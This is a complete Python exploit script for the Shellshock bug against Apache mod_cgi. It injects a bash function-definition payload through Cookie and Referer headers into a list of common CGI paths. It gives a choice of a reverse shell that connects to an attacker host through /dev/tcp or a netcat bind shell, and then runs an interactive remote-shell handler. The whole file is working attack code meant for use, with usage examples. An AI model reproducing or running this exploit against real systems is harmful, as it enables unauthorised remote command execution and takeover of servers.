#!/usr/bin/env python3
from socket import AF_INET, SOCK_STREAM
from threading import Thread
import threading, time, http.client, urllib.parse, sys, socket

stop = False
proxyhost = ""
proxyport = 0

def usage():
    print("""
Shellshock apache mod_cgi remote exploit

Usage:
./shellshock.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages: specific cgi vulnerable pages (comma-separated)
proxy: host:port proxy

Payloads:
"reverse" TCP reverse shell
"bind" TCP bind shell

Examples:
./shellshock.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./shellshock.py payload=bind rhost=1.2.3.4 rport=1234
""")
    sys.exit(0)

def exploit(lhost, lport, rhost, rport, payload, pages):
    headers = {"Cookie": payload, "Referer": payload}
    for page in pages:
        if stop:
            return
        print(f"[-] Trying exploit on: {page}")
        if proxyhost != "":
            conn = http.client.HTTPConnection(proxyhost, int(proxyport))
            conn.request("GET", f"http://{rhost}{page}", headers=headers)
        else:
            conn = http.client.HTTPConnection(rhost)
            conn.request("GET", page, headers=headers)
        res = conn.getresponse()
        if res.status == 404:
            print(f"[*] 404 on: {page}")
        time.sleep(1)

args = {}
for arg in sys.argv[1:]:
    if "=" in arg:
        k, v = arg.split("=", 1)
        args[k] = v

if 'payload' not in args:
    usage()

if args['payload'] == 'reverse':
    try:
        lhost = args['lhost']
        lport = int(args['lport'])
        rhost = args['rhost']
        payload = f"() {{ :;}}; /bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &'"
    except:
        usage()
elif args['payload'] == 'bind':
    try:
        rhost = args['rhost']
        rport = args['rport']
        payload = f"() {{ :;}}; /bin/bash -c 'nc -l -p {rport} -e /bin/bash &'"
    except:
        usage()
else:
    print("[*] Unsupported payload")
    usage()

try:
    pages = args['pages'].split(",")
except:
    pages = ["/cgi-sys/entropysearch.cgi", "/cgi-sys/defaultwebpage.cgi", "/cgi-mod/index.cgi", "/cgi-bin/test.cgi", "/cgi-bin-sdb/printenv"]

try:
    proxyhost, proxyport = args['proxy'].split(":")
except:
    pass

buff = 1024

if args['payload'] == 'reverse':
    serversocket = socket.socket(AF_INET, SOCK_STREAM)
    addr = (lhost, lport)
    serversocket.bind(addr)
    serversocket.listen(10)
    print("[!] Started reverse shell handler")
    threading.Thread(target=exploit, args=(lhost, lport, rhost, 0, payload, pages)).start()

if args['payload'] == 'bind':
    addr = (rhost, int(rport))
    threading.Thread(target=exploit, args=("", 0, rhost, rport, payload, pages)).start()

while True:
    if args['payload'] == 'reverse':
        try:
            clientsocket, clientaddr = serversocket.accept()
            print("[!] Successfully exploited")
            print(f"[!] Incoming connection from {clientaddr[0]}")
            stop = True
            clientsocket.settimeout(3)
            while True:
                try:
                    reply = input(f"{clientaddr[0]}> ")
                    clientsocket.sendall(f"{reply}\n".encode())
                    # Use a small delay to ensure command is processed
                    time.sleep(0.1)
                    # Receive data in chunks until socket timeout
                    received_data = ""
                    while True:
                        try:
                            chunk = clientsocket.recv(buff).decode(errors='replace')
                            if not chunk:
                                break
                            received_data += chunk
                        except socket.timeout:
                            break
                        except Exception:
                            break
                    print(received_data, end="")
                except KeyboardInterrupt:
                    print("\n[*] Keyboard interrupt detected")
                    break
                except Exception:
                    pass
        except:
            pass
    if args['payload'] == 'bind':
        try:
            serversocket = socket.socket(AF_INET, SOCK_STREAM)
            time.sleep(1)
            serversocket.connect(addr)
            print("[!] Successfully exploited")
            print(f"[!] Connected to {rhost}")
            stop = True
            serversocket.settimeout(3)
            while True:
                try:
                    reply = input(f"{rhost}> ")
                    serversocket.sendall(f"{reply}\n".encode())
                    # Use a small delay to ensure command is processed
                    time.sleep(0.1)
                    # Receive data in chunks until socket timeout
                    received_data = ""
                    while True:
                        try:
                            chunk = serversocket.recv(buff).decode(errors='replace')
                            if not chunk:
                                break
                            received_data += chunk
                        except socket.timeout:
                            break
                        except Exception:
                            break
                    print(received_data, end="")
                except KeyboardInterrupt:
                    print("\n[*] Keyboard interrupt detected")
                    break
                except Exception:
                    pass
        except:
            pass
